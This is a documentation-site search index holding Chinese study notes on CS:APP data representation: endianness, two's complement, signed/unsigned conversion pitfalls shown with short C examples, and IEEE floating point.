{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"home"},{"location":"_csapp/","text":"@import url('../css/gadgets/termynal.css'); body { } var termynal = new Termynal('#termynal', { typeDelay: 40, lineDelay: 700, lineData: [ { type: 'input', prompt: '$', value: 'show content' }, { value: 'Sure?' }, { type: 'input', typeDelay: 1000, prompt: '(y/n)', value: 'y' }, { type: 'progress', progressChar: '.' }, { value: 'Notes of Computer System' }, ] });","title":"Preface"},{"location":"_csapp/1_Basis/1/","text":"1. \u4fe1\u606f\u5b58\u50a8 \ud83e\uddd0 (1). \u6982\u5ff5 \ud83e\uddd0 \u5b57\u8282: \u6700\u5c0f\u5bfb\u5740\u5355\u4f4d\uff0c\u673a\u5668\u7a0b\u5e8f\u89c6\u5185\u5b58\u4e3a\u4e00\u4e2a\u5b57\u8282\u6570\u7ec4\uff0c\u5373\u865a\u62df\u5730\u5740\u7a7a\u95f4 \u5b57\u957f (word size): \u6307\u9488\u6807\u79f0\u5927\u5c0f\uff0c\u7f16\u7801\u865a\u62df\u5730\u5740\u7a7a\u95f4 64 \u4f4d\u673a\u5668\u5411\u540e\u517c\u5bb9 32 \u4f4d\u7a0b\u5e8f, 64 \u4f4d\u7a0b\u5e8f\u548c 32 \u4f4d\u7a0b\u5e8f\u4e0d\u540c\u5728\u4e8e\u5982\u4f55\u88ab\u7f16\u8bd1\u7684 \u4e3a\u907f\u514d\u6570\u636e\u5927\u5c0f\u9020\u6210\u7684\u8de8\u5e73\u53f0\u95ee\u9898 (\u4f8b\u5982\uff0c long \u5728 32 \u4f4d\u673a\u5927\u5c0f\u4e3a 4 byte), C99 \u5f15\u5165\u4e86 int32_t \u7b49 (2). \u5b57\u8282\u5e8f \ud83e\uddd0 addr 0x100 0x101 0x102 0x103 big endian 01 23 45 67 little endian 67 45 23 01 \u8bb8\u591a\u65b0\u578b\u5904\u7406\u5668\u652f\u6301\u53cc\u7aef\u6cd5\uff0c\u4f46\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u53ea\u652f\u6301\u5176\u4e2d\u4e00\u79cd\uff0c\u56e0\u800c\u5176\u5e73\u53f0\u72ec\u7acb\u6027\u66f4\u5f3a\u3002 show endian typedef unsigned char * bytePtr ; void showBytes ( bytePtr start , size_t len ) { size_t i ; for ( i = 0 ; i < len ; ++ i ) printf ( \" %.2x\" , start [ i ]); printf ( \" \\n \" ); } int main () { int a = 0x01234567 ; char * c = \"01234567\" ; showBytes (( bytePtr ) & a , sizeof ( int )); showBytes (( bytePtr ) c , 9 ); } \u5b57\u7b26\u4e32\u4ee5 0x00 \u7ed3\u5c3e\uff0c\u6cbf\u5730\u5740\u987a\u5e8f\u6392\u5217\uff0c\u65e0\u5173\u5927\u5c0f\u7aef\u3002 2. \u6574\u6570\u8868\u793a \ud83e\uddd0 (1). \u8865\u7801\u7f16\u7801 \ud83e\uddd0 \u8865\u7801 (two's complement) \u8fd0\u7528\u4e86\u540c\u4f59\u4fdd\u6301\u57fa\u672c\u8fd0\u7b97\u7684\u601d\u60f3\uff0c\u53ef\u4ee5\u6b63\u786e\u8ba1\u7b97\u52a0\u51cf\u4e58\u6cd5\u3002 $\\displaystyle \\qquad a\\equiv b \\pmod m,\\ c \\equiv d \\pmod m \\ \\Longrightarrow \\begin{cases}&a \\pm c \\equiv b \\pm d \\pmod m \\\\ &ac \\equiv bd \\pmod m \\end{cases} $ \u8bbe $x, y < 0$, \u4ee5 $f(x)=x+N$ \u8868\u793a\u7f16\u7801\u6620\u5c04, \u5219 $$ \\begin{aligned} x+y \\pmod N &\\equiv x+y+N \\pmod N \\equiv f(x+y) \\pmod N \\\\ &\\equiv x+N+y+N \\pmod N \\equiv f(x) + f(y) \\pmod N \\end{aligned} \\\\ f^{-1} (f(x) + f(y) - N) = f^{-1}(f(x+y)) = x + y $$ \u4ee5 8-bit \u6570\u4e3a\u4f8b\uff0c \u8865\u7801: $((-2) + (-4)) \\bmod 256 = (254 + 252) \\bmod 256 = 250 \\bmod 256,\\ f_{tc}^{-1}(250)=-6$ \u53cd\u7801: $((-2) + (-4)) \\bmod 255 = (253 + 251) \\bmod 255 = 249 \\bmod 255,\\ f_{oc}^{-1}(249)=-6$ \u53cd\u7801\u52a0\u6cd5\u6ea2\u51fa\u9700\u8981\u52a0\u4e00\uff0c\u4ee5\u4fdd\u6301 $\\mathrm{mod}\\ 255$ \u7684\u6027\u8d28 \u5b9e\u9645\u503c = \u8d1f\u6570 + \u6a21\u503c\uff0c\u56e0\u6b64\u7528\u533a\u95f4\u5185\u7684\u5927\u6570\u8868\u793a\u8d1f\u6570\uff0c\u533a\u95f4\u6620\u5c04\u662f\u5982\u4e0b\u5f62\u5f0f $\\qquad \\qquad [0, 255] \\ \\longrightarrow\\ [0, ..., x, -y, -y+1, ...]$ $x,y$ \u7684\u53d6\u503c\u5f71\u54cd\u6b63\u8d1f\u6570\u7684\u8303\u56f4\u3002\u5982\u679c\u4ee4 $x=127,\\ y=x+1$\uff0c\u6a21\u6570 $=256$\uff0c\u5c31\u4f7f\u5f97: \u8865\u7801: $x=127,\\ y=x+1$, \u6b63\u8d1f\u6570\u8303\u56f4\u5747, $a$ \u548c $-a$ \u5b9e\u9645\u503c\u4e4b\u95f4\u6ee1\u8db3\u53d6\u53cd\u52a0\u4e00\u7684\u5173\u7cfb (\u548c\u4e3a 256) \u53cd\u7801: $x=y=127$\uff0c\u6a21\u6570 $=255$\uff0c$0$ \u7684\u8868\u793a\u4e0d\u552f\u4e00\uff0c\u56e0\u6b64\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u8d1f\u6570\uff0c\u7531\u4e8e\u8861\u91cf\u7684\u662f\u548c\u6a21\u4e4b\u95f4\u7684\u8ddd\u79bb (\u5b9e\u9645\u503c = \u8d1f\u6570 + \u6a21\u503c)\uff0c\u56e0\u6b64\u4e0d\u8bba\u662f\u6269\u5c55\u6709\u7b26\u53f7\u6570\u7684\u4f4d\u8868\u793a\uff0c\u8fd8\u662f\u7b97\u6570\u53f3\u79fb >> \uff0c\u90fd\u9700\u8981\u590d\u5236\u6700\u9ad8\u4f4d\u3002 (2). \u6709\u7b26\u53f7\u6570\u548c\u65e0\u7b26\u53f7\u6570\u7684\u8f6c\u6362 \ud83e\uddd0 C \u8bed\u8a00\u4e2d\u4e8c\u8005\u8f6c\u6362\u57fa\u4e8e\u5e95\u5c42\u7684\u4f4d\u8868\u793a\u4e0d\u53d8\uff0c\u4e14\u4e8c\u8005\u4e4b\u95f4\u4e92\u76f8\u8d4b\u503c\u65f6\u4f1a\u53d1\u751f\u9690\u5f0f\u8f6c\u6362\u3002 int tx , ty ; unsigned ux , uy ; tx = ux ; // cast to signed uy = ty ; // cast to unsigned \u5f53\u6267\u884c\u4e00\u4e2a\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u6570\u6709\u7b26\u53f7\u800c\u53e6\u4e00\u4e2a\u65e0\u7b26\u53f7\uff0cC \u4f1a\u9690\u5f0f\u5c06\u6709\u7b26\u53f7\u6570\u5f3a\u5236\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u6570\uff0c\u7136\u540e\u518d\u6267\u884c\u8fd0\u7b97\u3002\u8fd9\u5bf9\u6807\u51c6\u8fd0\u7b97\u6765\u8bf4\u6ca1\u4ec0\u4e48\u5f71\u54cd\uff0c\u4f46\u4f1a\u9020\u6210\u5173\u7cfb\u8fd0\u7b97\u7684\u4e00\u4e9b\u5947\u7279\u884c\u4e3a\u3002 exp type value -1 < 0U unsigned 0 2147483647U > -2147483647 - 1 unsigned 0 2147483647 > (int) 2147483648U signed 1 eg1: unsigned in loop // if @length == 0, then ... float sumElements ( float a [], unsigned length ) { int i ; float result = 0 ; for ( i = 0 ; i <= length - 1 ; ++ i ) result += a [ i ]; return result ; } eg2: longer string /* Determine whether string s is longer than string t */ /* note: Prototype for strlen is: size_t strlen(const char* s) */ int strlonger ( char * s , char * t ) { return strlen ( s ) - strlen ( t ) > 0 ; } 3. \u6d6e\u70b9\u8868\u793a \ud83e\uddd0 (1). IEEE \u6d6e\u70b9\u8868\u793a \ud83e\uddd0 IEEE \u6807\u51c6\u7528\u2002 $V = (-1)^s \\times M \\times 2^E$ \u2002\u8868\u793a\u4e00\u4e2a\u6570: $s$: \u7b26\u53f7\u4f4d\uff0c\u51b3\u5b9a\u6b63\u8d1f\uff0c\u6570\u503c 0 \u7684\u7b26\u53f7\u4f4d\u7279\u6b8a\u5904\u7406 $E$: \u9636\u7801 (exponent)\uff0c$E=\\mathrm{e-Bias\\mathit{\\ \\ or\\ \\ } 1-Bias}$\uff0c$\\mathrm{e} = e_{k-1}...e_1e_0$\uff0c$\\mathrm{Bias}=2^{k-1}-1$ $M$: \u5c3e\u6570\uff0c$M = 1 + \\mathrm{f} \\ \\ \\mathit{or} \\ \\ \\mathrm{f}$\uff0c$\\mathrm{f} = 0.f_{n-1}...f_1f_0$ \u6839\u636e $\\mathrm{e}$ \u503c\u7684\u4e0d\u540c\uff0c\u7f16\u7801\u53ef\u5206\u4e3a\u89c4\u683c\u5316\u3001\u975e\u89c4\u683c\u5316\u3001\u7279\u6b8a\u503c\u4e09\u79cd\u60c5\u5f62: normalized:\u2002 $\\mathrm{e}$ \u65e2\u4e0d\u4e3a\u5168 0\uff0c\u4e5f\u4e0d\u4e3a\u5168 1\u3002$E=\\mathrm{e-Bias},\\enspace M=1+\\mathrm{f}=1.f_{n-1}...f_1f_0$ \"\u89c4\u683c\u5316\" \u7684\u542b\u4e49\u662f\u91c7\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u5373 $f=1.x$\uff0c\u6b64\u5904\u7684 $1$ \u662f\u9690\u5f0f\u5b58\u50a8\u7684 denormalized:\u2002 $\\mathrm{e}$ \u4e3a\u5168 0\u3002$E=\\mathrm{1-Bias},\\enspace M=f$ \u975e\u89c4\u683c\u5316\u6570\u63d0\u4f9b\u4e86\u8868\u793a 0 \u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u5747\u5300\u5206\u5e03\u7684\u5f88\u63a5\u8fd1\u4e8e 0 \u7684\u6570 $\\mathrm{1-Bias}$ \u7684\u542b\u4e49\u662f\u4e0e\u6700\u5c0f\u89c4\u683c\u5316\u6570\u8854\u63a5 special:\u2002 $\\mathrm{e}$ \u4e3a\u5168 1\u3002\u5f53 $f$ \u5168 0 \u65f6\uff0c\u4ee3\u8868 $\\pm \\infty$\uff1b\u5f53 $f$ \u975e\u96f6\uff0c\u8868\u793a $\\text{NaN}$ ($\\text{Not a Number}$) $\\infty$:\u2002 \u5927\u6570\u76f8\u4e58\u6216\u9664\u4ee5 0 \u65f6\u8868\u793a\u6ea2 $\\text{NaN}$:\u2002 \u8868\u793a\u4e0d\u4e3a\u5b9e\u6570\u6216\u65e0\u7a77\u7684\u8fd0\u7b97\uff0c\u5982 $\\sqrt{-1}$ \u6216 $\\infty - \\infty$ \u4f8b: \u628a $12345$ \u8f6c\u6362\u6210 float $ \\begin{aligned} &\\xRightarrow{normalize} 1.1000000111001_2 \\times 2^{13} \\\\ &\\xRightarrow{rm\\ 1, add\\ 10\\times 0} [10000001110010000000000] \\\\ &\\xRightarrow{13 + \\mathrm{bias}(127)=140} [10001100] \\\\ &\\xRightarrow{0} [0 \\ 10001100\\ 10000001110010000000000] \\end{aligned} $ \u6574\u6570\u7684\u4f4e\u4f4d\u548c\u6d6e\u70b9\u5c0f\u6570\u90e8\u5206\u7684\u9ad8\u4f4d\u662f\u5339\u914d\u7684\u3002 \u7531 $V=(-1)^s \\times M \\times 2^E$ \u53ef\u77e5\uff0c\u9636\u7801\u7684\u4f4d\u6570\u51b3\u5b9a\u8303\u56f4\uff0c\u9636\u7801\u548c\u5c3e\u6570\u7684\u4f4d\u6570\u5171\u540c\u51b3\u5b9a\u7cbe\u5ea6\uff0c\u4e14\u968f\u7740\u89c4\u683c\u6570\u7684\u503c\u7684\u53d8\u5927\uff0c\u7cbe\u5ea6\u9010\u6e10\u53d8\u5dee (2). \u820d\u5165 \ud83e\uddd0 \u56e0\u4e3a\u8868\u793a\u65b9\u6cd5\u9650\u5236\u4e86\u6d6e\u70b9\u6570\u7684\u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6\uff0c\u9700\u8981\u820d\u5165 (rounding) \u8fd0\u7b97\u5f97\u5230\u6700\u63a5\u8fd1\u671f\u671b\u503c\u7684\u6d6e\u70b9\u5f62\u5f0f\u3002IEEE \u6807\u51c6\u5b9a\u4e49\u4e86\u56db\u79cd\u820d\u5165\u65b9\u5f0f\uff0c\u9ed8\u8ba4\u91c7\u7528\u5411\u5076\u6570\u820d\u5165 (round-to-even)\u3002\u5176\u6839\u636e\u5728\u4e8e\uff0c\u5bf9\u4e8e\u4e00\u7ec4\u6d6e\u70b9\u6570\uff0c\u5982\u679c\u968f\u610f\u820d\u5165\u53ef\u80fd\u4f1a\u6539\u53d8\u5176\u5747\u503c\uff0c\u5411\u5076\u6570\u820d\u5165\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u907f\u514d\u4e86\u8fd9\u79cd\u7edf\u8ba1\u504f\u5dee\u3002 \u4f8b: $10.11100_2 \\approx 11.00_2$\uff0c $10.10100_2 \\approx 10.10_2$ (3). \u6d6e\u70b9\u8fd0\u7b97 \ud83e\uddd0 \u4e0d\u540c\u4e8e\u8865\u7801\u8fd0\u7b97\uff0c\u7531\u4e8e\u9700\u8981\u8003\u8651\u820d\u5165 ($x+^f y=\\mathrm{Round}(x+y)$)\uff0c\u6d6e\u70b9\u8fd0\u7b97\u7f3a\u5c11\u4e00\u4e9b\u91cd\u8981\u7684\u7fa4\u5c5e\u6027: (\u4ee5 float \u4e3a\u4f8b) \u52a0\u6cd5\u4e0d\u53ef\u7ed3\u5408: (3.14 + 1e10) - 1e10 = 0 \uff0c\u5927\u503c\u4e0b\u7cbe\u5ea6\u53d8\u5c0f\uff0c\u53d1\u751f\u820d\u5165 \u4e58\u6cd5\u4e0d\u53ef\u7ed3\u5408: (1e20 * 1e20) * 1e-20 = +\u221e \uff0c\u8d8a\u754c\u6210\u4e3a\u65e0\u7a77 \u4e58\u6cd5\u4e0d\u53ef\u5206\u914d: 1e20 * (1e20 - 1e20) = 0.0, 1e20 * 1e20 - 1e20 * 1e20 = NaN \u5bf9\u4e8e\u6d6e\u70b9\u6570\uff0c\u5047\u5982\u7f16\u8bd1\u5668\u7ed9\u5b9a\u4e86 x = a + b + c; y = b + c + d\uff1b \u90a3\u4e48 t = b + c; x = a + t; y = t + d; \u5c31\u662f\u672a\u8003\u8651\u7ed3\u5408\u65b9\u5f0f\u7684\u9519\u8bef\u4f18\u5316\u3002 (4). C \u4e2d\u7684\u6d6e\u70b9\u6570 \ud83e\uddd0 \u5f53 int \u3001 float \u3001 double \u4e4b\u95f4\u5f3a\u5236\u8f6c\u6362\u65f6\uff0c\u7a0b\u5e8f\u6539\u53d8\u6570\u503c\u7684\u539f\u5219: int \u2192 float :\u2002 \u4e0d\u4f1a\u6ea2\u51fa\uff0c\u7531\u4e8e float \u7cbe\u5ea6\u4f4e\u53ef\u80fd\u820d\u5165 int / float \u2192 double :\u2002 double \u7684\u8303\u56f4\u548c\u7cbe\u5ea6\u90fd\u66f4\u9ad8\uff0c\u80fd\u591f\u4fdd\u7559\u7cbe\u786e\u6570\u503c double \u2192 float :\u2002 \u503c\u53ef\u80fd\u6ea2\u51fa\u6210 $\\pm\\infty$\uff0c\u4e5f\u53ef\u80fd\u820d\u5165 float / double \u2192 int :\u2002 \u503c\u4f1a\u5411 0 \u820d\u5165\u3002\u4f8b\u5982\uff0c1.999 \u4f1a\u820d\u5165\u6210 1\uff0c\u56e0\u6b64\uff0c\u503c\u53ef\u80fd\u6ea2\u51fa \u5047\u8bbe\u53d8\u91cf x \uff0c f \u548c d \u5206\u522b\u662f int \uff0c float \u548c double \uff0c\u5b83\u4eec\u7684\u503c\u4efb\u610f\uff0c\u5224\u65ad\u4e0b\u5217\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a\u771f A . x == ( int ) ( double ) x B . x == ( int ) ( float ) x C . d == ( double ) ( float ) d D . f == ( float ) ( double ) f E . 1.0 / 2 == 1 / 2.0 F . ( f + d ) - f == d A. \u771f; \u2003 B. \u5047\uff0c\u4f8b\u5982 x = MAX_INT ; \u2003C. \u5047\uff0c\u4f8b\u5982 d = 1e40 \uff0c\u53f3\u4fa7\u7b49\u4e8e\u6b63\u65e0\u7a77 D. \u771f\uff1b\u2003 E. \u771f\uff0c\u6267\u884c\u9664\u6cd5\u524d\uff0c\u5206\u5b50\u5206\u6bcd\u90fd\u4f1a\u8f6c\u6362\u6210\u6d6e\u70b9\uff1b\u2003 F. \u5047","title":"1. information storage"},{"location":"_csapp/1_Basis/1/#1","text":"","title":"1. \u4fe1\u606f\u5b58\u50a8"},{"location":"_csapp/1_Basis/1/#1_1","text":"\u5b57\u8282: \u6700\u5c0f\u5bfb\u5740\u5355\u4f4d\uff0c\u673a\u5668\u7a0b\u5e8f\u89c6\u5185\u5b58\u4e3a\u4e00\u4e2a\u5b57\u8282\u6570\u7ec4\uff0c\u5373\u865a\u62df\u5730\u5740\u7a7a\u95f4 \u5b57\u957f (word size): \u6307\u9488\u6807\u79f0\u5927\u5c0f\uff0c\u7f16\u7801\u865a\u62df\u5730\u5740\u7a7a\u95f4 64 \u4f4d\u673a\u5668\u5411\u540e\u517c\u5bb9 32 \u4f4d\u7a0b\u5e8f, 64 \u4f4d\u7a0b\u5e8f\u548c 32 \u4f4d\u7a0b\u5e8f\u4e0d\u540c\u5728\u4e8e\u5982\u4f55\u88ab\u7f16\u8bd1\u7684 \u4e3a\u907f\u514d\u6570\u636e\u5927\u5c0f\u9020\u6210\u7684\u8de8\u5e73\u53f0\u95ee\u9898 (\u4f8b\u5982\uff0c long \u5728 32 \u4f4d\u673a\u5927\u5c0f\u4e3a 4 byte), C99 \u5f15\u5165\u4e86 int32_t \u7b49","title":"(1). \u6982\u5ff5"},{"location":"_csapp/1_Basis/1/#2","text":"addr 0x100 0x101 0x102 0x103 big endian 01 23 45 67 little endian 67 45 23 01 \u8bb8\u591a\u65b0\u578b\u5904\u7406\u5668\u652f\u6301\u53cc\u7aef\u6cd5\uff0c\u4f46\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u53ea\u652f\u6301\u5176\u4e2d\u4e00\u79cd\uff0c\u56e0\u800c\u5176\u5e73\u53f0\u72ec\u7acb\u6027\u66f4\u5f3a\u3002 show endian typedef unsigned char * bytePtr ; void showBytes ( bytePtr start , size_t len ) { size_t i ; for ( i = 0 ; i < len ; ++ i ) printf ( \" %.2x\" , start [ i ]); printf ( \" \\n \" ); } int main () { int a = 0x01234567 ; char * c = \"01234567\" ; showBytes (( bytePtr ) & a , sizeof ( int )); showBytes (( bytePtr ) c , 9 ); } \u5b57\u7b26\u4e32\u4ee5 0x00 \u7ed3\u5c3e\uff0c\u6cbf\u5730\u5740\u987a\u5e8f\u6392\u5217\uff0c\u65e0\u5173\u5927\u5c0f\u7aef\u3002","title":"(2). \u5b57\u8282\u5e8f"},{"location":"_csapp/1_Basis/1/#2_1","text":"","title":"2. \u6574\u6570\u8868\u793a"},{"location":"_csapp/1_Basis/1/#1_2","text":"\u8865\u7801 (two's complement) \u8fd0\u7528\u4e86\u540c\u4f59\u4fdd\u6301\u57fa\u672c\u8fd0\u7b97\u7684\u601d\u60f3\uff0c\u53ef\u4ee5\u6b63\u786e\u8ba1\u7b97\u52a0\u51cf\u4e58\u6cd5\u3002 $\\displaystyle \\qquad a\\equiv b \\pmod m,\\ c \\equiv d \\pmod m \\ \\Longrightarrow \\begin{cases}&a \\pm c \\equiv b \\pm d \\pmod m \\\\ &ac \\equiv bd \\pmod m \\end{cases} $ \u8bbe $x, y < 0$, \u4ee5 $f(x)=x+N$ \u8868\u793a\u7f16\u7801\u6620\u5c04, \u5219 $$ \\begin{aligned} x+y \\pmod N &\\equiv x+y+N \\pmod N \\equiv f(x+y) \\pmod N \\\\ &\\equiv x+N+y+N \\pmod N \\equiv f(x) + f(y) \\pmod N \\end{aligned} \\\\ f^{-1} (f(x) + f(y) - N) = f^{-1}(f(x+y)) = x + y $$ \u4ee5 8-bit \u6570\u4e3a\u4f8b\uff0c \u8865\u7801: $((-2) + (-4)) \\bmod 256 = (254 + 252) \\bmod 256 = 250 \\bmod 256,\\ f_{tc}^{-1}(250)=-6$ \u53cd\u7801: $((-2) + (-4)) \\bmod 255 = (253 + 251) \\bmod 255 = 249 \\bmod 255,\\ f_{oc}^{-1}(249)=-6$ \u53cd\u7801\u52a0\u6cd5\u6ea2\u51fa\u9700\u8981\u52a0\u4e00\uff0c\u4ee5\u4fdd\u6301 $\\mathrm{mod}\\ 255$ \u7684\u6027\u8d28 \u5b9e\u9645\u503c = \u8d1f\u6570 + \u6a21\u503c\uff0c\u56e0\u6b64\u7528\u533a\u95f4\u5185\u7684\u5927\u6570\u8868\u793a\u8d1f\u6570\uff0c\u533a\u95f4\u6620\u5c04\u662f\u5982\u4e0b\u5f62\u5f0f $\\qquad \\qquad [0, 255] \\ \\longrightarrow\\ [0, ..., x, -y, -y+1, ...]$ $x,y$ \u7684\u53d6\u503c\u5f71\u54cd\u6b63\u8d1f\u6570\u7684\u8303\u56f4\u3002\u5982\u679c\u4ee4 $x=127,\\ y=x+1$\uff0c\u6a21\u6570 $=256$\uff0c\u5c31\u4f7f\u5f97: \u8865\u7801: $x=127,\\ y=x+1$, \u6b63\u8d1f\u6570\u8303\u56f4\u5747, $a$ \u548c $-a$ \u5b9e\u9645\u503c\u4e4b\u95f4\u6ee1\u8db3\u53d6\u53cd\u52a0\u4e00\u7684\u5173\u7cfb (\u548c\u4e3a 256) \u53cd\u7801: $x=y=127$\uff0c\u6a21\u6570 $=255$\uff0c$0$ \u7684\u8868\u793a\u4e0d\u552f\u4e00\uff0c\u56e0\u6b64\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u8d1f\u6570\uff0c\u7531\u4e8e\u8861\u91cf\u7684\u662f\u548c\u6a21\u4e4b\u95f4\u7684\u8ddd\u79bb (\u5b9e\u9645\u503c = \u8d1f\u6570 + \u6a21\u503c)\uff0c\u56e0\u6b64\u4e0d\u8bba\u662f\u6269\u5c55\u6709\u7b26\u53f7\u6570\u7684\u4f4d\u8868\u793a\uff0c\u8fd8\u662f\u7b97\u6570\u53f3\u79fb >> \uff0c\u90fd\u9700\u8981\u590d\u5236\u6700\u9ad8\u4f4d\u3002","title":"(1). \u8865\u7801\u7f16\u7801"},{"location":"_csapp/1_Basis/1/#2_2","text":"C \u8bed\u8a00\u4e2d\u4e8c\u8005\u8f6c\u6362\u57fa\u4e8e\u5e95\u5c42\u7684\u4f4d\u8868\u793a\u4e0d\u53d8\uff0c\u4e14\u4e8c\u8005\u4e4b\u95f4\u4e92\u76f8\u8d4b\u503c\u65f6\u4f1a\u53d1\u751f\u9690\u5f0f\u8f6c\u6362\u3002 int tx , ty ; unsigned ux , uy ; tx = ux ; // cast to signed uy = ty ; // cast to unsigned \u5f53\u6267\u884c\u4e00\u4e2a\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u6570\u6709\u7b26\u53f7\u800c\u53e6\u4e00\u4e2a\u65e0\u7b26\u53f7\uff0cC \u4f1a\u9690\u5f0f\u5c06\u6709\u7b26\u53f7\u6570\u5f3a\u5236\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u6570\uff0c\u7136\u540e\u518d\u6267\u884c\u8fd0\u7b97\u3002\u8fd9\u5bf9\u6807\u51c6\u8fd0\u7b97\u6765\u8bf4\u6ca1\u4ec0\u4e48\u5f71\u54cd\uff0c\u4f46\u4f1a\u9020\u6210\u5173\u7cfb\u8fd0\u7b97\u7684\u4e00\u4e9b\u5947\u7279\u884c\u4e3a\u3002 exp type value -1 < 0U unsigned 0 2147483647U > -2147483647 - 1 unsigned 0 2147483647 > (int) 2147483648U signed 1 eg1: unsigned in loop // if @length == 0, then ... float sumElements ( float a [], unsigned length ) { int i ; float result = 0 ; for ( i = 0 ; i <= length - 1 ; ++ i ) result += a [ i ]; return result ; } eg2: longer string /* Determine whether string s is longer than string t */ /* note: Prototype for strlen is: size_t strlen(const char* s) */ int strlonger ( char * s , char * t ) { return strlen ( s ) - strlen ( t ) > 0 ; }","title":"(2). \u6709\u7b26\u53f7\u6570\u548c\u65e0\u7b26\u53f7\u6570\u7684\u8f6c\u6362"},{"location":"_csapp/1_Basis/1/#3","text":"","title":"3. \u6d6e\u70b9\u8868\u793a"},{"location":"_csapp/1_Basis/1/#1-ieee","text":"IEEE \u6807\u51c6\u7528\u2002 $V = (-1)^s \\times M \\times 2^E$ \u2002\u8868\u793a\u4e00\u4e2a\u6570: $s$: \u7b26\u53f7\u4f4d\uff0c\u51b3\u5b9a\u6b63\u8d1f\uff0c\u6570\u503c 0 \u7684\u7b26\u53f7\u4f4d\u7279\u6b8a\u5904\u7406 $E$: \u9636\u7801 (exponent)\uff0c$E=\\mathrm{e-Bias\\mathit{\\ \\ or\\ \\ } 1-Bias}$\uff0c$\\mathrm{e} = e_{k-1}...e_1e_0$\uff0c$\\mathrm{Bias}=2^{k-1}-1$ $M$: \u5c3e\u6570\uff0c$M = 1 + \\mathrm{f} \\ \\ \\mathit{or} \\ \\ \\mathrm{f}$\uff0c$\\mathrm{f} = 0.f_{n-1}...f_1f_0$ \u6839\u636e $\\mathrm{e}$ \u503c\u7684\u4e0d\u540c\uff0c\u7f16\u7801\u53ef\u5206\u4e3a\u89c4\u683c\u5316\u3001\u975e\u89c4\u683c\u5316\u3001\u7279\u6b8a\u503c\u4e09\u79cd\u60c5\u5f62: normalized:\u2002 $\\mathrm{e}$ \u65e2\u4e0d\u4e3a\u5168 0\uff0c\u4e5f\u4e0d\u4e3a\u5168 1\u3002$E=\\mathrm{e-Bias},\\enspace M=1+\\mathrm{f}=1.f_{n-1}...f_1f_0$ \"\u89c4\u683c\u5316\" \u7684\u542b\u4e49\u662f\u91c7\u7528\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u5373 $f=1.x$\uff0c\u6b64\u5904\u7684 $1$ \u662f\u9690\u5f0f\u5b58\u50a8\u7684 denormalized:\u2002 $\\mathrm{e}$ \u4e3a\u5168 0\u3002$E=\\mathrm{1-Bias},\\enspace M=f$ \u975e\u89c4\u683c\u5316\u6570\u63d0\u4f9b\u4e86\u8868\u793a 0 \u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u5747\u5300\u5206\u5e03\u7684\u5f88\u63a5\u8fd1\u4e8e 0 \u7684\u6570 $\\mathrm{1-Bias}$ \u7684\u542b\u4e49\u662f\u4e0e\u6700\u5c0f\u89c4\u683c\u5316\u6570\u8854\u63a5 special:\u2002 $\\mathrm{e}$ \u4e3a\u5168 1\u3002\u5f53 $f$ \u5168 0 \u65f6\uff0c\u4ee3\u8868 $\\pm \\infty$\uff1b\u5f53 $f$ \u975e\u96f6\uff0c\u8868\u793a $\\text{NaN}$ ($\\text{Not a Number}$) $\\infty$:\u2002 \u5927\u6570\u76f8\u4e58\u6216\u9664\u4ee5 0 \u65f6\u8868\u793a\u6ea2 $\\text{NaN}$:\u2002 \u8868\u793a\u4e0d\u4e3a\u5b9e\u6570\u6216\u65e0\u7a77\u7684\u8fd0\u7b97\uff0c\u5982 $\\sqrt{-1}$ \u6216 $\\infty - \\infty$ \u4f8b: \u628a $12345$ \u8f6c\u6362\u6210 float $ \\begin{aligned} &\\xRightarrow{normalize} 1.1000000111001_2 \\times 2^{13} \\\\ &\\xRightarrow{rm\\ 1, add\\ 10\\times 0} [10000001110010000000000] \\\\ &\\xRightarrow{13 + \\mathrm{bias}(127)=140} [10001100] \\\\ &\\xRightarrow{0} [0 \\ 10001100\\ 10000001110010000000000] \\end{aligned} $ \u6574\u6570\u7684\u4f4e\u4f4d\u548c\u6d6e\u70b9\u5c0f\u6570\u90e8\u5206\u7684\u9ad8\u4f4d\u662f\u5339\u914d\u7684\u3002 \u7531 $V=(-1)^s \\times M \\times 2^E$ \u53ef\u77e5\uff0c\u9636\u7801\u7684\u4f4d\u6570\u51b3\u5b9a\u8303\u56f4\uff0c\u9636\u7801\u548c\u5c3e\u6570\u7684\u4f4d\u6570\u5171\u540c\u51b3\u5b9a\u7cbe\u5ea6\uff0c\u4e14\u968f\u7740\u89c4\u683c\u6570\u7684\u503c\u7684\u53d8\u5927\uff0c\u7cbe\u5ea6\u9010\u6e10\u53d8\u5dee","title":"(1). IEEE \u6d6e\u70b9\u8868\u793a"},{"location":"_csapp/1_Basis/1/#2_3","text":"\u56e0\u4e3a\u8868\u793a\u65b9\u6cd5\u9650\u5236\u4e86\u6d6e\u70b9\u6570\u7684\u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6\uff0c\u9700\u8981\u820d\u5165 (rounding) \u8fd0\u7b97\u5f97\u5230\u6700\u63a5\u8fd1\u671f\u671b\u503c\u7684\u6d6e\u70b9\u5f62\u5f0f\u3002IEEE \u6807\u51c6\u5b9a\u4e49\u4e86\u56db\u79cd\u820d\u5165\u65b9\u5f0f\uff0c\u9ed8\u8ba4\u91c7\u7528\u5411\u5076\u6570\u820d\u5165 